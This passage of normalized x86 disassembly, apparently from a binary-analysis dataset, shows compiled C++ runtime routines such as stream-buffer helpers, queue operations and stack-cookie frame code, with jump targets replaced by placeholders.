mov ecx [ ebp - 0x14 ]
or ecx 0x1
mov [ ebp - 0x14 ] ecx
sub_412830
push ebp
mov ebp esp
push 0xffffffff
push sub_43ba38
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40dab0
movzx eax al
test eax eax
je r-xdata
push 0x0
push 0x2
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_410690
xor al al
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_4143d0
test eax eax
je r-xdata
movzx eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4143d0
mov ecx eax
call sub_4105b0
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40dab0
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_40db00
and eax 0x1
je r-xdata
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_40db80
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x38 ]
push ecx
call sub_416150
add esp 0x4
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
call sub_40d130
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x1c ]
add ecx [ eax + 0x4 ]
call sub_4106c0
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
call sub_4108b0
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
call sub_40cb50
mov [ ebp - 0x3c ] eax
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x3c ]
push eax
call sub_40cad0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
call sub_40cab0
add esp 0x4
movzx edx al
push edx
push 0x48
mov ecx [ ebp - 0x44 ]
call sub_40d3e0
mov [ ebp - 0x1d ] al
movzx eax [ ebp - 0x1d ]
test eax eax
jne r-xdata
push 0x0
push 0x1
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x1c ]
add ecx [ eax + 0x4 ]
call sub_410690
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
mov ecx [ ebp - 0x1c ]
add ecx [ eax + 0x4 ]
call sub_4106c0
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
call sub_410910
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_412a50
push ebp
mov ebp esp
push 0xffffffff
push sub_43bae8
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x24 ]
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
push 0x1
mov ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x20 ]
call sub_410760
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x20 ]
call sub_4107d0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x8 ]
or ecx [ eax + 0xc ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x28 ]
or edx 0x2
mov [ ebp - 0x30 ] edx
jmp r-xdata
jg r-xdata
push 0x0
mov ecx [ ebp - 0x30 ]
push ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx ]
mov ecx [ ebp - 0x24 ]
add ecx [ eax + 0x4 ]
call sub_410690
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_40dde0
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
lea edx [ ebp + 0x14 ]
push edx
call sub_40cac0
add esp 0x4
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ebp - 0x24 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4106c0
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
call sub_4108b0
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_40cb50
mov [ ebp - 0x44 ] eax
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x38 ]
jne r-xdata
mov ecx [ ebp - 0x28 ]
or ecx 0x1
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x1
mov ecx [ ebp + 0x10 ]
sbb ecx 0x0
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] ecx
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ eax + 0xc ]
adc edx 0x0
mov eax [ ebp - 0x24 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x24 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
call sub_412d30
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ eax + 0xc ]
adc edx 0x0
mov eax [ ebp - 0x24 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
lea ecx [ ebp - 0x18 ]
push ecx
call sub_40cab0
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
jmp r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x24 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x3c ]
call sub_410910
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x28 ]
or edx 0x2
mov [ ebp - 0x28 ] edx
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
sub_412cb0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x8 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
add ecx [ eax + 0x4 ]
call sub_4106c0
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x10 ]
mov eax [ edx + 0x4 ]
call eax
sub_412d30
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412fb0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
call eax
mov [ ebp - 0x8 ] eax
jg r-xdata
mov ecx [ ebp - 0x4 ]
call sub_412f20
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_412d90
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413070
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_40cac0
add esp 0x4
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov [ ebp - 0xc ] eax
jg r-xdata
mov ecx [ ebp - 0x4 ]
call sub_413020
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
mov edx [ ebp - 0x8 ]
push edx
call sub_40cac0
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_412e60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x2c ]
mov ecx [ ecx ]
add ecx [ eax ]
mov eax ecx
mov esp ebp
pop ebp
retn
sub_412e80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov edx [ ecx ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax ]
add ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x4
sub_412ec0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov ecx [ ecx ]
add ecx [ eax ]
mov eax ecx
mov esp ebp
pop ebp
retn
sub_412ee0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_412f20
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov edx [ ecx ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov [ eax ] ecx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_412f70
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov edx [ ecx ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_412fb0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
cmp [ ecx ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x2c ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov esp ebp
pop ebp
retn
sub_412fe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov edx [ ecx ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
add ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0x4
sub_413020
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov edx [ ecx ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ eax ] ecx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_413070
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov esp ebp
pop ebp
retn
sub_4130a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x8
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402130
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_40bd00
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_40c030
mov esp ebp
pop ebp
retn 0x4
sub_413120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
push eax
mov ecx [ ebp + 0x8 ]
call sub_414d60
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_413150
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_414d60
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_413180
push ebp
mov ebp esp
push 0xffffffff
push sub_43b253
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
call sub_402080
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x14 ]
call sub_414750
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0xd ]
call sub_401d60
lea eax [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0x14 ]
add ecx 0x8
call sub_414870
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
movss xmm0 [ r--data ]
movss [ ecx + 0x1c ] xmm0
push 0x8
mov ecx [ ebp - 0x14 ]
call sub_413340
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_413220
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
call sub_414690
mov [ ebp - 0x10 ] eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_4145d0
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_414600
push eax
lea ecx [ ebp - 0x8 ]
call sub_411e30
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_410f70
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_414d40
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0xc ]
call sub_4146e0
movzx ecx al
test ecx ecx
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_414d40
push eax
call sub_402180
add esp 0x4
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0xc ]
call sub_4146e0
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_414db0
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_4145b0
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_410f70
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_413340
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414590
push eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x1
push ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_414890
mov edx [ ebp + 0x8 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] edx
mov esp ebp
pop ebp
retn 0x4
sub_413390
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
movzx eax [ ebp + 0xc ]
push eax
movzx ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414730
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_4133e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_414d20
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_413410
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call sub_414860
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414790
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
sub_4134c0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_414c20
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4134f0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_413520
push ebp
mov ebp esp
push 0xffffffff
push sub_43bab8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_414930
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x18 ]
call sub_414dd0
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_414140
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_413590
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_4134f0
movzx eax al
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_414d00
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0xc ]
xor edx edx
mov esi 0x1
div esi
imul edx edx 0x18
mov eax [ ebp - 0x10 ]
add edx [ ecx + eax * 4 ]
push edx
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_416b30
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x10 ]
sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x10 ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x0
jmp r-xdata
sub_413630
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_40cb60
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x8 ]
add eax [ ecx + 0x10 ]
xor edx edx
mov ecx 0x1
div ecx
test edx edx
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
sub eax 0x1
mov ecx [ ebp - 0x8 ]
and eax [ ecx + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
add ecx [ edx + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_414d00
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x8 ] eax
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ ebp - 0x10 ]
xor edx edx
mov esi 0x1
div esi
imul edx edx 0x18
mov eax [ ebp - 0xc ]
add edx [ ecx + eax * 4 ]
push edx
lea ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_416b50
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x10 ] eax
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x1
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_414ce0
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx [ ebp - 0x8 ]
